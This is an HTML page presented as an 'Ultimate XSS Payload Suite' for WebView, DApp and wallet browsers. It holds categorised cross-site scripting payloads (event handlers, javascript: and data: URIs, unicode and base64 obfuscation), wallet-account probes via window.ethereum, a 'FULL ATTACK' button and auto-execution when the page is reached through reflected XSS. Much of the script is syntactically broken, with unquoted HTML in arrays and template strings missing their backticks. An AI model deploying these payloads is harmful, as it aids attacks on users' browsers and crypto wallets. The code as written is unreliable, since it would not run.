<!DOCTYPE html>
<html>
<head>
    <title>üî• Ultimate Universal XSS Payload v2.0</title>
    <meta charset="UTF-8">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:monospace;background:#1a1a1a;color:#00ff00;padding:20px;overflow:auto;}
        .btn{padding:15px 30px;font-size:18px;background:linear-gradient(45deg,#ff006e,#8338ec);color:white;border:none;border-radius:8px;cursor:pointer;transition:all 0.3s;}
        .btn:hover{transform:scale(1.05);box-shadow:0 0 20px #ff006e;}
        #output{background:#000;padding:15px;border-radius:8px;font-size:14px;line-height:1.4;max-height:60vh;overflow:auto;}
        .status{padding:10px;margin:10px 0;border-radius:5px;}
        .success{background:#004d00;}
        .error{background:#4d0000;}
        .info{background:#001a4d;}
    </style>
</head>
<body>
    <h1>üöÄ Ultimate XSS Payload Suite</h1>
    <p><strong>Universal coverage untuk WebView/DApps/Wallet browsers</strong></p>
    
    <button class="btn" onclick="executeAll()">üí• CLICK HERE - FULL ATTACK</button>
    <br><br>
    
    <div id="output" class="status info">Status: Ready for execution...</div>

    <script>
        // Comprehensive XSS payload database
        const XSS_PAYLOADS = {
            basic: [
                alert('1Ô∏è‚É£ Basic Script'),
                eval('alert("2Ô∏è‚É£ Eval")'),
                Function('alert("3Ô∏è‚É£ Function ctor")')()
            ],
            events: [
                <img src=x onerror=alert('4Ô∏è‚É£ onerror')>,
                <svg onload=alert('5Ô∏è‚É£ SVG onload')>,
                <details open ontoggle=alert('6Ô∏è‚É£ ontoggle')>
            ],
            protocols: [
                javascript:alert('7Ô∏è‚É£ javascript:'),
                vbscript:msgbox('8Ô∏è‚É£ vbscript'),
                data:text/html,<script>alert('9Ô∏è‚É£ data:')</script>
            ],
            templates: [
                \${alert('üîü Template literal')},
                \alert\`('11Ô∏è‚É£ Backtick')`,
                "alert("12Ô∏è‚É£ String breakout")
            ],
            webview: [
                <iframe src="javascript:alert('13Ô∏è‚É£ iframe js')"></iframe>,
                <object data="javascript:alert('14Ô∏è‚É£ object data')">,
                <embed src="javascript:alert('15Ô∏è‚É£ embed src')>
            ],
            wallet: [
                window.ethereum&&ethereum.request({method:'eth_accounts'}),
                web3&&web3.eth.getAccounts(),
                window.postMessage({xss:true,payload:'wallet'},'*')
            ],
            advanced: [
                top['\u0061\u006c\u0065\u0072\u0074'](16), // Unicode alert
                constructor.constructor('alert(17)')(), // Prototype pollution
                atob('YWxlcnQoMTgp') // Base64 alert
            ]
        };

        function log(type, msg) {
            const output = document.getElementById('output');
            const ts = new Date().toLocaleTimeString();
            output.innerHTML += [${ts}] [${type}] ${msg}\n;
            output.scrollTop = output.scrollHeight;
            output.className = status ${type === 'SUCCESS' ? 'success' : type === 'ERROR' ? 'error' : 'info'};
        }

        function testPayload(payload, name) {
            try {
                const div = document.createElement('div');
                div.style.display = 'none';
                div.innerHTML = payload;
                document.body.appendChild(div);
                
                // Check if payload executed (various detection methods)
                if (window.xss_marker) {
                    log('SUCCESS', ${name}: EXECUTED);
                    delete window.xss_marker;
                } else {
                    log('INFO', ${name}: Rendered (check manually));
                }
            } catch(e) {
                log('ERROR', ${name}: ${e.message});
            }
        }

        function executeAll() {
            log('INFO', 'üöÄ Starting comprehensive XSS test suite...');
            
            // Flatten all payloads
            const allPayloads = Object.entries(XSS_PAYLOADS).flatMap(([cat, pays]) => 
                pays.map(p => ({payload: p, name: `${cat.toUpperCase()}: ${p.substring(0,30)}...`}))
            );

            allPayloads.forEach(({payload, name}, i) => {
                setTimeout(() => {
                    // Inject marker for execution detection
                    window.xss_marker = true;
                    testPayload(payload, name);
                }, i * 300);
            });

            // WebView/Wallet specific tests
            setTimeout(() => {
                log('INFO', 'üîç WebView/DApps detection:');
                log('INFO', UserAgent: ${navigator.userAgent.substring(0,80)}...);
                log('INFO', Ethereum: ${!!window.ethereum});
                log('INFO', Web3: ${!!window.web3});
                
                // Try wallet interaction
                if (window.ethereum) {
                    ethereum.request({method: 'eth_accounts'}).then(accounts => {
                        log('SUCCESS', Wallet accounts found: ${accounts.length});
                    }).catch(() => log('INFO', 'Wallet access denied (expected)'));
                }
            }, 5000);
        }

        // Auto-execute jika dipanggil via reflected XSS
        if (location.search.includes('xss=1') || location.hash.includes('auto')) {
            setTimeout(executeAll, 500);
        }

        // Persistence hook
        window.addEventListener('message', e => {
            if (e.data.xss) log('SUCCESS', 'üí∞ Wallet hook intercepted!');
        });
    </script>
</body>
</html>
